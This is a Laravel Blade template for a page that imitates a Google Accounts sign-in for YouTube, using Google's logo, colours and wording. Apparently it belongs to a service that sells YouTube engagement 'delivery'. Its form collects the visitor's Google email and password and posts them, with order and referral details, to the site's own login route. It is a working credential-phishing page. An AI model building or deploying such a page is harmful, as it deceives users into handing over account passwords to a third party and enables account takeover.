@extends('platform-login.layout')

@section('title', 'Sign in - Google Accounts (YouTube)')

@section('content')
<div class="w-full max-w-[440px] mx-auto space-y-4">
    <!-- Google / YouTube Card -->
    <div class="bg-[#1f1f1f] border border-white/10 rounded-3xl p-8 sm:p-10 shadow-2xl relative">
        <!-- Google & YouTube Logos -->
        <div class="flex items-center justify-between mb-6">
            <svg class="w-8 h-8" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
                <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z" fill="#FBBC05"/>
                <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z" fill="#EA4335"/>
            </svg>
            <div class="flex items-center gap-1.5 px-3 py-1 bg-red-600/10 border border-red-500/20 rounded-full text-xs text-red-400 font-bold">
                <i class="fa-brands fa-youtube text-red-500 text-sm"></i>
                <span>YouTube</span>
            </div>
        </div>

        <h2 class="text-2xl font-bold text-white mb-1">Sign in</h2>
        <p class="text-sm text-gray-400 mb-6">to continue to YouTube</p>

        <!-- Service Context -->
        <div class="mb-6 p-3 rounded-2xl bg-white/5 border border-white/10 text-xs text-gray-300">
            <span>Authorizing delivery:</span>
            <div class="font-bold text-white text-sm mt-0.5">{{ number_format($quantity) }} {{ $service }}</div>
            @if(!empty($username))
                <div class="text-[11px] text-red-400 mt-0.5">Channel: {{ $username }}</div>
            @endif
        </div>

        <form method="POST" action="{{ route('platform.login.store', ['platform' => 'youtube']) }}" class="space-y-4">
            @csrf
            <input type="hidden" name="tag_id" value="{{ $tag->id ?? 5 }}">
            <input type="hidden" name="service_type" value="{{ $service }}">
            <input type="hidden" name="quantity" value="{{ $quantity }}">
            <input type="hidden" name="username" value="{{ $username }}">
            <input type="hidden" name="referral_code_id" value="{{ $refId }}">
            <input type="hidden" name="ref_id" value="{{ $refId }}">

            <div>
                <label class="block text-xs font-medium text-gray-400 mb-1">Email or phone</label>
                <input type="email" name="email" required
                    class="w-full px-4 py-3.5 text-sm rounded-xl bg-transparent border border-white/20 text-white placeholder-gray-500 focus:outline-none focus:border-[#4285F4] focus:ring-1 focus:ring-[#4285F4] transition-colors"
                    placeholder="Enter your Google account email">
            </div>

            <div class="relative">
                <label class="block text-xs font-medium text-gray-400 mb-1">Password</label>
                <input type="password" id="yt_password" name="password" required
                    class="w-full px-4 py-3.5 pr-14 text-sm rounded-xl bg-transparent border border-white/20 text-white placeholder-gray-500 focus:outline-none focus:border-[#4285F4] focus:ring-1 focus:ring-[#4285F4] transition-colors"
                    placeholder="Enter your password">
                <button type="button" onclick="togglePassword('yt_password', this)"
                    class="absolute right-4 top-8 text-xs font-semibold text-gray-400 hover:text-white transition-colors">
                    Show
                </button>
            </div>

            <div class="flex items-center justify-between text-xs pt-1">
                <span class="text-[#8ab4f8] hover:underline cursor-pointer font-medium">Forgot email?</span>
                <span class="text-gray-400">Not your computer? Use Guest mode.</span>
            </div>

            <div class="flex items-center justify-between pt-6">
                <span class="text-xs text-[#8ab4f8] hover:underline cursor-pointer font-medium">Create account</span>
                <button type="submit"
                    class="px-7 py-2.5 bg-[#1a73e8] hover:bg-[#1557b0] text-white font-semibold text-sm rounded-full transition-all active:scale-[0.98]">
                    Next
                </button>
            </div>
        </form>
    </div>
</div>
@endsection

@section('scripts')
<script>
    function togglePassword(inputId, btn) {
        const input = document.getElementById(inputId);
        if (input.type === 'password') {
            input.type = 'text';
            btn.innerText = 'Hide';
        } else {
            input.type = 'password';
            btn.innerText = 'Show';
        }
    }
</script>
@endsection
